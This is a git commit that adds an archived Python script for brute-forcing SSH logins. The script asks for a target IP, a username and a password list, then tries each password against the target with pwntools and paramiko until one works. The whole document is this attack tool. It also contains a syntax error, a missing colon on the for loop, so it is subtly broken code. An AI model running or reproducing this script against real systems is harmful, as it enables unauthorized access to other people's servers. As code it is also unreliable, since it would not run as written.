8650d70ada333b05454d780ce8d731a03c0b8c5a
ParadoxReagent <73672349+ParadoxReagent@users.noreply.github.com>
2023-03-19 23:42:17 -0400

    archival
    moved deprecated projects

---
+++ Archived/SSHBruteForce.py
@@ -0,0 +1,24 @@
+#!/usr/bin/env python
+
+from pwn import *
+import paramiko
+
+host = input("Please type in your targets IP address: ")	# user enters in host SSH IP
+username = input("Please type in your targets username: ")	# user enters in username they would like to use for brute force
+password_file = input("Please enter desired password.txt") 
+attempts = 0
+
+with open(password_file, "r") as password_list:
+	for password in password_list
+		password = password.strip("\n")
+		try:
+			print("[{}] Attempting password: '{}'!".format(attempts, password))
+			response = ssh(host=host, user=username, password=password, timeout=1)
+			if response.connected():
+				print("[>] Valid password found: '{}'!".format(password))
+				response.close()
+				break
+			response.close()
+		except paramiko.ssh_exception.AuthenticationException:
+			print("[X] Invalid password!")
+		attempts += 1
